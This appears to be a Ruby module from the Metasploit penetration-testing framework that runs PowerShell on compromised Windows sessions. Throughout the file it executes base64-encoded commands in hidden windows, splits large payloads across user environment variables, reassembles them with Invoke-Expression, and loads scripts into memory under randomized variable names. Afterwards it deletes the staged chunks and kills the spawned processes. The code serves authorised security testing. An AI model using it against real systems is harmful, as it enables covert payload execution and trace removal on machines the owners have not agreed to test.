# -*- coding: binary -*-
require 'msf/core/exploit/powershell'
require 'msf/core/post/common'

module Msf
  class Post
    module Windows
      ##
      # Powershell exploitation routines
      ##
      module Powershell
        include ::Msf::Exploit::Powershell
        include ::Msf::Post::Common

        def initialize(info = {})
          super
          register_advanced_options(
            [
              OptInt.new('Powershell::Post::timeout',
                         [true, 'Powershell execution timeout, set < 0 to run async without termination', 15]),
              OptBool.new('Powershell::Post::log_output', [true, 'Write output to log file', false]),
              OptBool.new('Powershell::Post::dry_run', [true, 'Return encoded output to caller', false]),
              OptBool.new('Powershell::Post::force_wow64', [true, 'Force WOW64 execution', false]),
            ], self.class
          )
        end

        #
        # Returns true if powershell is installed
        #
        def have_powershell?
          cmd_exec('cmd.exe', '/c "echo. | powershell get-host"') =~ /Name.*Version.*InstanceId/m
        end

        #
        # Returns the Powershell version
        #
        def get_powershell_version
          return nil unless have_powershell?

          process, _pid, _c = execute_script('$PSVersionTable.PSVersion')

          o = ''

          while (d = process.channel.read)
            if d == ""
              if (Time.now.to_i - start < time_out) && (o == '')
                sleep 0.1
              else
                break
              end
            else
              o << d
            end
          end

          o.scan(/[\d \-]+/).last.split[0, 2] * '.'
        end

        #
        # Get/compare list of current PS processes - nested execution can spawn many children
        # doing checks before and after execution allows us to kill more children...
        # This is a hack, better solutions are welcome since this could kill user
        # spawned powershell windows created between comparisons.
        #
        def get_ps_pids(pids = [])
          current_pids = session.sys.process.get_processes.keep_if { |p| p['name'].casecmp('powershell.exe').zero? }.map { |p| p['pid'] }
          # Subtract previously known pids
          current_pids = (current_pids - pids).uniq
          current_pids
        end

        #
        # Execute a powershell script and return the output, channels, and pids. The script
        # is never written to disk.
        #
        def execute_script(script, greedy_kill = false)
          @session_pids ||= []
          running_pids = greedy_kill ? get_ps_pids : []
          open_channels = []
          # Execute using -EncodedCommand
          session.response_timeout = datastore['Powershell::Post::timeout'].to_i
          ps_bin = datastore['Powershell::Post::force_wow64'] ?
            '%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe' : 'powershell.exe'

          # Check to ensure base64 encoding - regex format and content length division
          unless script.to_s.match(/[A-Za-z0-9+\/]+={0,3}/)[0] == script.to_s && (script.to_s.length % 4).zero?
            script = encode_script(script.to_s)
          end

          ps_string = "-EncodedCommand #{script} -InputFormat None"
          vprint_good "EXECUTING:\n#{ps_bin} #{ps_string}"
          cmd_out = session.sys.process.execute(ps_bin, ps_string, { 'Hidden' => true, 'Channelized' => true })

          # Subtract prior PIDs from current
          if greedy_kill
            Rex::ThreadSafe.sleep(3) # Let PS start child procs
            running_pids = get_ps_pids(running_pids)
          end

          # Add to list of running processes
          running_pids << cmd_out.pid

          # All pids start here, so store them in a class variable
          (@session_pids += running_pids).uniq!

          # Add to list of open channels
          open_channels << cmd_out

          [cmd_out, running_pids.uniq, open_channels]
        end

        #
        # Powershell scripts that are longer than 8000 bytes are split into 8000
        # byte chunks and stored as CMD environment variables. A new powershell
        # script is built that will reassemble the chunks and execute the script.
        # Returns the reassembly script.
        #
        def stage_cmd_env(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))
          # Check to ensure script is encoded and compressed
          if compressed_script =~ /\s|\.|\;/
            compressed_script = compress_script(compressed_script)
          end

          # Divide the encoded script into 8000 byte chunks and iterate
          index = 0
          count = 8000
          while index < compressed_script.size - 1
            # Define random, but serialized variable name
            env_variable = format("%05d%s", ((index + 8000) / 8000), env_suffix)

            # Create chunk
            chunk = compressed_script[index, count]

            # Build the set commands
            set_env_variable =  "[Environment]::SetEnvironmentVariable(" \
                                "'#{env_variable}'," \
                                "'#{chunk}', 'User')"

            # Compress and encode the set command
            encoded_stager = encode_script(compress_script(set_env_variable))

            # Stage the payload
            print_good " - Bytes remaining: #{compressed_script.size - index}"
            execute_script(encoded_stager, false)

            index += count
          end

          # Build the script reassembler
          reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
          reassemble_command += "Select-String #{env_suffix}|Sort-Object|%{"
          reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
          reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
          reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"

          # Compress and encode the reassemble command
          encoded_script = encode_script(compress_script(reassemble_command))

          encoded_script
        end

        #
        # Uploads a script into a Powershell session via memory (Powershell session types only).
        # If the script is larger than 15000 bytes the script will be uploaded in a staged approach
        #
        def stage_psh_env(script)
          begin
            ps_script = read_script(script)
            encoded_expression = encode_script(ps_script)
            cleanup_commands = []
            # Add entropy to script variable names
            script_var = ps_script.rig.generate(4)
            decscript = ps_script.rig.generate(4)
            scriptby = ps_script.rig.generate(4)
            scriptbybase = ps_script.rig.generate(4)
            scriptbybasefull = ps_script.rig.generate(4)

            if encoded_expression.size > 14999
              print_error "Script size: #{encoded_expression.size} This script requires a stager"
              arr = encoded_expression.chars.each_slice(14999).map(&:join)
              print_good "Loading #{arr.count} chunks into the stager."
              vararray = []
              arr.each_with_index do |slice, index|
                variable = ps_script.rig.generate(5)
                vararray << variable
                indexval = index + 1
                vprint_good "Loaded stage:#{indexval}"
                session.shell_command("$#{variable} = \"#{slice}\"")
                cleanup_commands << "Remove-Variable #{variable} -EA 0"
              end

              linkvars = ''
              vararray.each { |var| linkvars << " + $#{var}" }
              linkvars.slice!(0..2)
              session.shell_command("$#{script_var} = #{linkvars}")

            else
              print_good "Script size: #{encoded_expression.size}"
              session.shell_command("$#{script_var} = \"#{encoded_expression}\"")
            end

            session.shell_command("$#{decscript} = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($#{script_var}))")
            session.shell_command("$#{scriptby}  = [System.Text.Encoding]::UTF8.GetBytes(\"$#{decscript}\")")
            session.shell_command("$#{scriptbybase} = [System.Convert]::ToBase64String($#{scriptby}) ")
            session.shell_command("$#{scriptbybasefull} = ([System.Convert]::FromBase64String($#{scriptbybase}))")
            session.shell_command("([System.Text.Encoding]::UTF8.GetString($#{scriptbybasefull}))|iex")
            print_good "Module loaded"

            unless cleanup_commands.empty?
              vprint_good "Cleaning up #{cleanup_commands.count} stager variables"
              session.shell_command(cleanup_commands.join(';').to_s)
            end
          rescue Errno::EISDIR => e
            vprint_error "Unable to upload script: #{e.message}"
          end
        end

        #
        # Reads output of the command channel and empties the buffer.
        # Will optionally log command output to disk.
        #
        def get_ps_output(cmd_out, eof, read_wait = 5)
          results = ''

          if datastore['Powershell::Post::log_output']
            # Get target's computer name
            computer_name = session.sys.config.sysinfo['Computer']

            # Create unique log directory
            log_dir = ::File.join(Msf::Config.log_directory, 'scripts', 'powershell', computer_name)
            ::FileUtils.mkdir_p(log_dir)

            # Define log filename
            time_stamp  = ::Time.now.strftime('%Y%m%d:%H%M%S')
            log_file    = ::File.join(log_dir, "#{time_stamp}.txt")

            # Open log file for writing
            fd = ::File.new(log_file, 'w+')
          end

          # Read output until eof or nil return output and write to log
          loop do
            line = ::Timeout.timeout(read_wait) do
              cmd_out.channel.read
            end rescue nil
            break if line.nil?
            if line.sub!(/#{eof}/, '')
              results << line
              fd.write(line) if fd
              break
            end
            results << line
            fd.write(line) if fd
          end

          # Close log file
          fd.close if fd

          results
        end

        #
        # Clean up powershell script including process and chunks stored in environment variables
        #
        def clean_up(script_file = nil, eof = '', running_pids = [], open_channels = [],
                     env_suffix = Rex::Text.rand_text_alpha(8), delete = false)
          # Remove environment variables
          env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
          env_del_command += "Select-String #{env_suffix}|%{"
          env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"

          script = compress_script(env_del_command, eof)
          cmd_out, new_running_pids, new_open_channels = execute_script(script)
          get_ps_output(cmd_out, eof)

          # Kill running processes, should mutex this...
          @session_pids = (@session_pids + running_pids + new_running_pids).uniq
          (running_pids + new_running_pids).uniq.each do |pid|
            begin
              if session.sys.process.processes.map { |x| x['pid'] }.include?(pid)
                session.sys.process.kill(pid)
              end
              @session_pids.delete(pid)
            rescue Rex::Post::Meterpreter::RequestError => e
              print_error "Failed to kill #{pid} due to #{e}"
            end
          end

          # Close open channels
          (open_channels + new_open_channels).uniq.each do |chan|
            chan.channel.close
          end

          ::File.delete(script_file) if script_file && delete
        end

        # Simple script execution wrapper, performs all steps
        # required to execute a string of powershell.
        # This method will try to kill all powershell.exe PIDs
        # which appeared during its execution, set greedy_kill
        # to false if this is not desired.
        #
        def psh_exec(script, greedy_kill = true, ps_cleanup = true)
          # Define vars
          eof = Rex::Text.rand_text_alpha(8)
          # eof = "THIS__SCRIPT_HAS__COMPLETED_EXECUTION#{rand(100)}"
          env_suffix = Rex::Text.rand_text_alpha(8)
          script = Rex::Powershell::Script.new(script) unless script.respond_to?(:compress_code)

          # Check to ensure base64 encoding - regex format and content length division
          unless script.to_s.match(/[A-Za-z0-9+\/]+={0,3}/)[0] == script.to_s && (script.to_s.length % 4).zero?
            script = encode_script(compress_script(script.to_s, eof), eof)
          end

          if datastore['Powershell::Post::dry_run']
            return "powershell -EncodedCommand #{script}"
          else
            # Check 8k cmd buffer limit, stage if needed
            if script.size > 8100
              vprint_error "Compressed size: #{script.size}"
              error_msg =  "Compressed size may cause command to exceed " \
                           "cmd.exe's 8kB character limit."
              vprint_error error_msg
              vprint_good 'Launching stager:'
              script = stage_cmd_env(script, env_suffix)
              print_good "Payload successfully staged."
            else
              print_good "Compressed size: #{script.size}"
            end

            vprint_good "Final command #{script}"

            # Execute the script, get the output, and kill the resulting PIDs
            cmd_out, running_pids, open_channels = execute_script(script, greedy_kill)
            if datastore['Powershell::Post::timeout'].to_i < 0
              out =  "Started async execution of #{running_pids.join(', ')}, output collection and cleanup will not be performed"
              # print_error out
              return out
            end
            ps_output = get_ps_output(cmd_out, eof, datastore['Powershell::Post::timeout'])
            # Kill off the resulting processes if needed
            if ps_cleanup
              vprint_good "Cleaning up #{running_pids.join(', ')}"
              clean_up(nil, eof, running_pids, open_channels, env_suffix, false)
            end

            return ps_output
          end
        end
      end
    end
  end
end
